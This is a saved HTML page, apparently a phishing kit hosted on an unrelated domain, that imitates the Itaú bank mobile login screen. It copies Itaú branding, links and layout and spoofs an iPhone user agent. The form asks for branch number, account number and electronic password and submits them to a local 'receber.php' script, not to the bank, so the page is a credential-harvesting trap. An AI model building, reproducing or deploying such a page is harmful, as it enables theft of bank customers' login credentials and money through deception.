
<!-- saved from url=(0053)http://sistemadecameras.esy.es/guarda/ini/clas/it.php -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="format-detection" content="telephone=no">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="Pragma" content="no-cache"><meta http-equiv="Expires" content="-1"><meta http-equiv="Cache-control" content="no-store">
    <title>
    Itaú 30 horas
</title><link id="ctl00_CssMaster" rel="stylesheet" type="text/css" href="./it_files/iphone.css"><script type="text/javascript">navigator.__defineGetter__("userAgent",function(){return "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"})</script>
<script language="javascript" src="./it_files/scripts.js.download"></script>
<script>
function proximoCampo(atual,proximo){
if(atual.value.length >= atual.maxLength){
document.getElementById(proximo).focus();
}
}
</script>
<style></style></head>
<body onload="scrollTo(0, 1);" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
  <script>
  // jQuery Mask Plugin v1.14.0
// github.com/igorescobar/jQuery-Mask-Plugin
(function(b){"function"===typeof define&&define.amd?define(["jquery"],b):"object"===typeof exports?module.exports=b(require("jquery")):b(jQuery||Zepto)})(function(b){var y=function(a,e,d){var c={invalid:[],getCaret:function(){try{var r,b=0,e=a.get(0),d=document.selection,f=e.selectionStart;if(d&&-1===navigator.appVersion.indexOf("MSIE 10"))r=d.createRange(),r.moveStart("character",-c.val().length),b=r.text.length;else if(f||"0"===f)b=f;return b}catch(g){}},setCaret:function(r){try{if(a.is(":focus")){var c,
b=a.get(0);b.setSelectionRange?(b.focus(),b.setSelectionRange(r,r)):(c=b.createTextRange(),c.collapse(!0),c.moveEnd("character",r),c.moveStart("character",r),c.select())}}catch(e){}},events:function(){a.on("keydown.mask",function(c){a.data("mask-keycode",c.keyCode||c.which)}).on(b.jMaskGlobals.useInput?"input.mask":"keyup.mask",c.behaviour).on("paste.mask drop.mask",function(){setTimeout(function(){a.keydown().keyup()},100)}).on("change.mask",function(){a.data("changed",!0)}).on("blur.mask",function(){n===
c.val()||a.data("changed")||a.trigger("change");a.data("changed",!1)}).on("blur.mask",function(){n=c.val()}).on("focus.mask",function(a){!0===d.selectOnFocus&&b(a.target).select()}).on("focusout.mask",function(){d.clearIfNotMatch&&!p.test(c.val())&&c.val("")})},getRegexMask:function(){for(var a=[],c,b,d,f,l=0;l<e.length;l++)(c=g.translation[e.charAt(l)])?(b=c.pattern.toString().replace(/.{1}$|^.{1}/g,""),d=c.optional,(c=c.recursive)?(a.push(e.charAt(l)),f={digit:e.charAt(l),pattern:b}):a.push(d||
c?b+"?":b)):a.push(e.charAt(l).replace(/[-\/\\^$*+?.()|[\]{}]/g,"\\$&"));a=a.join("");f&&(a=a.replace(new RegExp("("+f.digit+"(.*"+f.digit+")?)"),"($1)?").replace(new RegExp(f.digit,"g"),f.pattern));return new RegExp(a)},destroyEvents:function(){a.off("input keydown keyup paste drop blur focusout ".split(" ").join(".mask "))},val:function(c){var b=a.is("input")?"val":"text";if(0<arguments.length){if(a[b]()!==c)a[b](c);b=a}else b=a[b]();return b},getMCharsBeforeCount:function(a,c){for(var b=0,d=0,
f=e.length;d<f&&d<a;d++)g.translation[e.charAt(d)]||(a=c?a+1:a,b++);return b},caretPos:function(a,b,d,h){return g.translation[e.charAt(Math.min(a-1,e.length-1))]?Math.min(a+d-b-h,d):c.caretPos(a+1,b,d,h)},behaviour:function(d){d=d||window.event;c.invalid=[];var e=a.data("mask-keycode");if(-1===b.inArray(e,g.byPassKeys)){var m=c.getCaret(),h=c.val().length,f=c.getMasked(),l=f.length,k=c.getMCharsBeforeCount(l-1)-c.getMCharsBeforeCount(h-1),n=m<h;c.val(f);n&&(8!==e&&46!==e&&(m=c.caretPos(m,h,l,k)),
c.setCaret(m));return c.callbacks(d)}},getMasked:function(a,b){var m=[],h=void 0===b?c.val():b+"",f=0,l=e.length,k=0,n=h.length,q=1,p="push",u=-1,t,w;d.reverse?(p="unshift",q=-1,t=0,f=l-1,k=n-1,w=function(){return-1<f&&-1<k}):(t=l-1,w=function(){return f<l&&k<n});for(;w();){var x=e.charAt(f),v=h.charAt(k),s=g.translation[x];if(s)v.match(s.pattern)?(m[p](v),s.recursive&&(-1===u?u=f:f===t&&(f=u-q),t===u&&(f-=q)),f+=q):s.optional?(f+=q,k-=q):s.fallback?(m[p](s.fallback),f+=q,k-=q):c.invalid.push({p:k,
v:v,e:s.pattern}),k+=q;else{if(!a)m[p](x);v===x&&(k+=q);f+=q}}h=e.charAt(t);l!==n+1||g.translation[h]||m.push(h);return m.join("")},callbacks:function(b){var g=c.val(),m=g!==n,h=[g,b,a,d],f=function(a,b,c){"function"===typeof d[a]&&b&&d[a].apply(this,c)};f("onChange",!0===m,h);f("onKeyPress",!0===m,h);f("onComplete",g.length===e.length,h);f("onInvalid",0<c.invalid.length,[g,b,a,c.invalid,d])}};a=b(a);var g=this,n=c.val(),p;e="function"===typeof e?e(c.val(),void 0,a,d):e;g.mask=e;g.options=d;g.remove=
function(){var b=c.getCaret();c.destroyEvents();c.val(g.getCleanVal());c.setCaret(b-c.getMCharsBeforeCount(b));return a};g.getCleanVal=function(){return c.getMasked(!0)};g.getMaskedVal=function(a){return c.getMasked(!1,a)};g.init=function(e){e=e||!1;d=d||{};g.clearIfNotMatch=b.jMaskGlobals.clearIfNotMatch;g.byPassKeys=b.jMaskGlobals.byPassKeys;g.translation=b.extend({},b.jMaskGlobals.translation,d.translation);g=b.extend(!0,{},g,d);p=c.getRegexMask();!1===e?(d.placeholder&&a.attr("placeholder",d.placeholder),
a.data("mask")&&a.attr("autocomplete","off"),c.destroyEvents(),c.events(),e=c.getCaret(),c.val(c.getMasked()),c.setCaret(e+c.getMCharsBeforeCount(e,!0))):(c.events(),c.val(c.getMasked()))};g.init(!a.is("input"))};b.maskWatchers={};var A=function(){var a=b(this),e={},d=a.attr("data-mask");a.attr("data-mask-reverse")&&(e.reverse=!0);a.attr("data-mask-clearifnotmatch")&&(e.clearIfNotMatch=!0);"true"===a.attr("data-mask-selectonfocus")&&(e.selectOnFocus=!0);if(z(a,d,e))return a.data("mask",new y(this,
d,e))},z=function(a,e,d){d=d||{};var c=b(a).data("mask"),g=JSON.stringify;a=b(a).val()||b(a).text();try{return"function"===typeof e&&(e=e(a)),"object"!==typeof c||g(c.options)!==g(d)||c.mask!==e}catch(n){}};b.fn.mask=function(a,e){e=e||{};var d=this.selector,c=b.jMaskGlobals,g=c.watchInterval,c=e.watchInputs||c.watchInputs,n=function(){if(z(this,a,e))return b(this).data("mask",new y(this,a,e))};b(this).each(n);d&&""!==d&&c&&(clearInterval(b.maskWatchers[d]),b.maskWatchers[d]=setInterval(function(){b(document).find(d).each(n)},
g));return this};b.fn.masked=function(a){return this.data("mask").getMaskedVal(a)};b.fn.unmask=function(){clearInterval(b.maskWatchers[this.selector]);delete b.maskWatchers[this.selector];return this.each(function(){var a=b(this).data("mask");a&&a.remove().removeData("mask")})};b.fn.cleanVal=function(){return this.data("mask").getCleanVal()};b.applyDataMask=function(a){a=a||b.jMaskGlobals.maskElements;(a instanceof b?a:b(a)).filter(b.jMaskGlobals.dataMaskAttr).each(A)};var p={maskElements:"input,td,span,div",
dataMaskAttr:"*[data-mask]",dataMask:!0,watchInterval:300,watchInputs:!0,useInput:function(a){var b=document.createElement("div"),d;a="on"+a;d=a in b;d||(b.setAttribute(a,"return;"),d="function"===typeof b[a]);return d}("input"),watchDataMask:!1,byPassKeys:[9,16,17,18,36,37,38,39,40,91],translation:{0:{pattern:/\d/},9:{pattern:/\d/,optional:!0},"#":{pattern:/\d/,recursive:!0},A:{pattern:/[a-zA-Z0-9]/},S:{pattern:/[a-zA-Z]/}}};b.jMaskGlobals=b.jMaskGlobals||{};p=b.jMaskGlobals=b.extend(!0,{},p,b.jMaskGlobals);
p.dataMask&&b.applyDataMask();setInterval(function(){b.jMaskGlobals.watchDataMask&&b.applyDataMask()},p.watchInterval)});

$(function() {
 $('#ctl00_ContentPlaceHolder1_txtContaT').mask('00000-0');
    });
</script>
  
  
  

<form name="ctl00$ContentPlaceHolder1$btnLogInT" method="post" action="receber.php" onsubmit="return validation1()">

<table width="100%" style="position:absolute; height:100%" border="0" cellpadding="0" cellspacing="0">
      <tbody><tr style="height:10px" valign="top">
            <td>
                <table id="ctl00_tbTopo" height="10px" border="0" width="100%" background="./it_files/bg_iph_nm.png" style="background-repeat:repeat-x; background-size: auto 70px;">
    <tbody><tr id="ctl00_trlogos">
        <td id="ctl00_tdPrincipal1" width="50%" align="left">
                            <img src="./it_files/logo_nm.png" width="80" height="80" border="0">
              </td>
        <td id="ctl00_TdPrincipal3" width="50%" align="right">
                            <img src="./it_files/30_nm.png" width="45" height="45" border="0">
              </td>
    </tr>
    <tr id="ctl00_trBannerAcaoIncentivo" style="height:20px">
        <td colspan="3" align="center">&nbsp;</td>
    </tr>
    <tr>
        <td colspan="3" class="PF_TituloIphone">
                            &nbsp;&nbsp;
                            <span id="ctl00_lblTitulo">Cliente Itau</span>
              </td>
    </tr>
</tbody></table>

            </td>
        </tr>
        <tr valign="top">
            <td valign="top">
                
    <div id="ctl00_ContentPlaceHolder1_PanTouch">
    
        <table border="0" width="100%" background="./it_files/saved_resource" style="background-repeat: no-repeat; background-position: 50px 00px">
            <tbody><tr width="100%">
                <td>
                    <fieldset>
                        <table border="0" width="100%" height="35px">
                            <tbody><tr height="8px">
                                <td colspan="2"></td>
                            </tr>
                            <tr style="font-size: 14px;">
                                <td class="PF_textoNegrito">
                                    &nbsp;Agência
                                </td>
                                <td class="PF_textoNegrito">
                                    Conta
                                </td>
                            </tr>
                            
                             <tr id="ctl00_ContentPlaceHolder1_trW" style="font-size: 14px;">
        <td>
        
         <input id="ctl00_ContentPlaceHolder1_txtAgenciaT" size="5" name="agencia" type="tel" pattern="[0-9]*" maxlength="4" onkeyup="proximoCampo(this, &#39;ctl00_ContentPlaceHolder1_txtContaT&#39;)">
         &nbsp;
                               </td>
        <td style="vertical-align: middle;">
                                    <input id="ctl00_ContentPlaceHolder1_txtContaT" size="8" name="conta" type="tel" onkeyup="proximoCampo(this, &#39;ctl00_ContentPlaceHolder1_txtPassT&#39;)" maxlength="7">
                               </td>
    </tr>
    
                            
                            
                        </tbody></table>
                        <table id="ctl00_ContentPlaceHolder1_tbSenhaGeralT" border="0" width="100%" height="35px">
        <tbody><tr style="font-size: 14px;vertical-align: middle;">
            <td class="PF_textoNegrito">
                                    &nbsp;Senha eletrônica
                    </td>
        </tr>
        <tr style="font-size: 14px;vertical-align: middle;">
            <td>&nbsp;<input name="senha" type="tel" maxlength="8" style="-webkit-text-security:disc; text-security:disc;" id="ctl00_ContentPlaceHolder1_txtPassT" pattern="[0-9]*" size="9" style="vertical-align: middle;">&nbsp;<input type="image" name="ctl00$ContentPlaceHolder1$btnLogInT" id="ctl00_ContentPlaceHolder1_btnLogInT" src="./it_files/bt-ok.png" style="height:25px;width:28px;border-width:0px;vertical-align: middle; border: 0"></td>
        </tr>
    </tbody></table>
    
                        <table>
                            <tbody><tr style="font-size: 14px;">
                                <td>
                                    <input id="ctl00_ContentPlaceHolder1_chkSalvarT" type="checkbox" name="ctl00$ContentPlaceHolder1$chkSalvarT"><label for="ctl00_ContentPlaceHolder1_chkSalvarT">Lembrar agência e conta</label>&nbsp; 
                                </td>
                            </tr>
                            <tr height="8px">
                                <td>
                                    
                                </td>
                            </tr>
                        </tbody></table>

<table id="ctl00_ContentPlaceHolder1_TbDiversosTouch" border="0" width="100%" background="./it_files/ItauLogo.png" style="background-repeat:no-repeat;background-position:50px 00px;">
  <tbody><tr>
            <td class="PF_TituloIphone">
                    &nbsp;&nbsp;&nbsp;Serviços
          </td>
        </tr>
        <tr width="100%">
            <td>
                    <fieldset id="ctl00_ContentPlaceHolder1_FldProdServ">                                                                       
                                         
                    <div class="row" id="DiviToken" style="display:none;"><a href="http://www.itau.com.br/iTokenAplicativo.html" style="text-decoration:none;"><table style="vertical-align:middle;" border="0" width="100%" height="40px">
                <tbody><tr style="vertical-align:middle;">
                    <td width="1%"><img src="./it_files/spacer.gif" border="0" class="hideSpacerPJ"></td>
                    <td class="PF_texto" align="left"><span>Gerar código iToken</span></td>
                    <td width="1%" align="left" class="setaMenuPJ"><img src="./it_files/seta_laranja.png" width="11" height="15" border="0"></td>
                    <td width="1%"></td>
                </tr>
            </tbody></table>
            </a></div><div class="row" id="DivSimPrevidencia" style="display:none;"><a href="http://www.itau.com.br/SimPrevidencia.html" style="text-decoration:none;"><table style="vertical-align:middle;" border="0" width="100%" height="40px">
                <tbody><tr style="vertical-align:middle;">
                    <td width="1%"><img src="./it_files/spacer.gif" border="0" class="hideSpacerPJ"></td>
                    <td class="PF_texto" align="left"><span>Simulador de previdência</span></td>
                    <td width="1%" align="left" class="setaMenuPJ"><img src="./it_files/seta_laranja.png" width="11" height="15" border="0"></td>
                    <td width="1%"></td>
                </tr>
            </tbody></table>
            </a></div><div class="row"><a href="https://ww70.itau.com.br/M/atendimento.aspx?92A78B8589C3227C9DA8E5323384BAAA08D04652D4928D6C" style="text-decoration:none;"><table style="vertical-align:middle;" border="0" width="100%" height="40px">
                <tbody><tr style="vertical-align:middle;">
                    <td width="1%"><img src="./it_files/spacer.gif" border="0" class="hideSpacerPJ"></td>
                    <td class="PF_texto" align="left"><span>Telefones</span></td>
                    <td width="1%" align="left" class="setaMenuPJ"><img src="./it_files/seta_laranja.png" width="11" height="15" border="0"></td>
                    <td width="1%"></td>
                </tr>
            </tbody></table>
            </a></div><div class="row" style="border-bottom:0px;"><a href="https://ww70.itau.com.br/M/cotacao.aspx?95BB81989E9F7A2C6DBC93EE062A0BAB8ED5E0C6288FA129" style="text-decoration:none;"><table style="vertical-align:middle;" border="0" width="100%" height="40px">
                <tbody><tr style="vertical-align:middle;">
                    <td width="1%"><img src="./it_files/spacer.gif" border="0" class="hideSpacerPJ"></td>
                    <td class="PF_texto" align="left"><span>Indicadores de mercado</span></td>
                    <td width="1%" align="left" class="setaMenuPJ"><img src="./it_files/seta_laranja.png" width="11" height="15" border="0"></td>
                    <td width="1%"></td>
                </tr>
            </tbody></table>
            </a></div></fieldset>
          </td>
        </tr>
        <tr>
            <td class="PF_TituloIphone">
                    &nbsp;&nbsp;&nbsp;Buscar
          </td>
        </tr>
        <tr width="100%">
            <td>
                    <fieldset id="ctl00_ContentPlaceHolder1_flsbuscar">
                    <div class="row"><a href="http://itau.mobi/iph/rede_atendimento/rede_agencias_nm.jsp" style="text-decoration:none;"><table style="vertical-align:middle;" border="0" width="100%" height="40px">
                <tbody><tr style="vertical-align:middle;">
                    <td width="1%"><img src="./it_files/spacer.gif" border="0" class="hideSpacerPJ"></td>
                    <td class="PF_texto" align="left"><span>Agências</span></td>
                    <td width="1%" align="left" class="setaMenuPJ"><img src="./it_files/seta_laranja.png" width="11" height="15" border="0"></td>
                    <td width="1%"></td>
                </tr>
            </tbody></table>
            </a></div><div class="row"><a href="http://itau.mobi/iph/rede_atendimento/rede_caixas_nm.jsp" style="text-decoration:none;"><table style="vertical-align:middle;" border="0" width="100%" height="40px">
                <tbody><tr style="vertical-align:middle;">
                    <td width="1%"><img src="./it_files/spacer.gif" border="0" class="hideSpacerPJ"></td>
                    <td class="PF_texto" align="left"><span>Caixas eletrônicos</span></td>
                    <td width="1%" align="left" class="setaMenuPJ"><img src="./it_files/seta_laranja.png" width="11" height="15" border="0"></td>
                    <td width="1%"></td>
                </tr>
            </tbody></table>
            </a></div><div class="row" style="border-bottom:0px;"><a href="http://itau.mobi/iph/rede_atendimento/rede_cheques_nm.jsp" style="text-decoration:none;"><table style="vertical-align:middle;" border="0" width="100%" height="40px">
                <tbody><tr style="vertical-align:middle;">
                    <td width="1%"><img src="./it_files/spacer.gif" border="0" class="hideSpacerPJ"></td>
                    <td class="PF_texto" align="left"><span>Dispensadores de cheques</span></td>
                    <td width="1%" align="left" class="setaMenuPJ"><img src="./it_files/seta_laranja.png" width="11" height="15" border="0"></td>
                    <td width="1%"></td>
                </tr>
            </tbody></table>
            </a></div></fieldset>
          </td>
        </tr>
</tbody></table>
    
        
                        
        
        <table border="0" width="100%">
            <tbody><tr>
                <td>
                    
                    <table border="0" width="100%" cellspacing="0" cellpadding="0">
                        <tbody><tr>
                            <td width="3%">
                            </td>
                            <td width="94%">
                                <img src="./it_files/spacer.gif">
                            </td>
                            <td width="3%">
                            </td>
                        </tr>
                    </tbody></table>                
                </td>
            </tr>
        </tbody></table>
              
    


            </fieldset></td>
        </tr>
        <tr style="height:50px;vertical-align:bottom;">
            <td valign="bottom">
                <table id="ctl00_UCDefinicaoTecnologiaUsuario1_TbDefTecnoUsuarioB" border="0" width="100%" cellspacing="0" cellpadding="0">
    <tbody><tr width="100%" valign="top">
        <td width="2%"></td>
        <td width="96%"><a href="https://ww70.itau.com.br/M/Config/Configuracao.aspx" id="ctl00_UCDefinicaoTecnologiaUsuario1_lnkConfiguracao" class="link_padrao1">Configurações</a></td>
        <td width="2%"></td>
    </tr>
</tbody></table>

        <table border="0" width="1%" cellspacing="6" cellpadding="0"><tbody><tr><td width="1%"></td></tr></tbody></table>
        <table border="0" width="100%" cellspacing="0" cellpadding="0" id="TbDefTecnoUsuario2">
        <tbody><tr width="100%" valign="top">
            <td width="2%"></td>
            <td id="ctl00_UCDefinicaoTecnologiaUsuario1_tdAcessar" width="96%" class="PF_texto10Normal">Acessar o Itaú na versão:</td>

            <td width="2%"></td>
            </tr><tr width="100%" valign="top">
                <td width="2%"></td>
                <td class="PF_texto10Normal" width="95%"><a href="https://ww70.itau.com.br/M/LoginPF.aspx?3809EA6F3A81035D3657E32364444C30D1608F9CD3C79D6CCD70AEE19932D44A" id="ctl00_UCDefinicaoTecnologiaUsuario1_lnkSimplificado" class="link_padrao1">Celular</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a id="ctl00_UCDefinicaoTecnologiaUsuario1_lnkTouch" class="PF_texto10Normal" style="text-decoration:none;">Celular touch</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="http://www.itau.com.br/" id="ctl00_UCDefinicaoTecnologiaUsuario1_lnkPC" class="link_padrao1">PC</a></td>
                <td width="2%"></td>
            </tr>
    </tbody></table>

            </td>
        </tr>
    </tbody></table>
    
<div></div>

<script type="text/javascript">
//<![CDATA[
WebForm_AutoFocus('ctl00_ContentPlaceHolder1_txtAgenciaT');//]]>
</script>




</div></td></tr></tbody></table></form></body></html>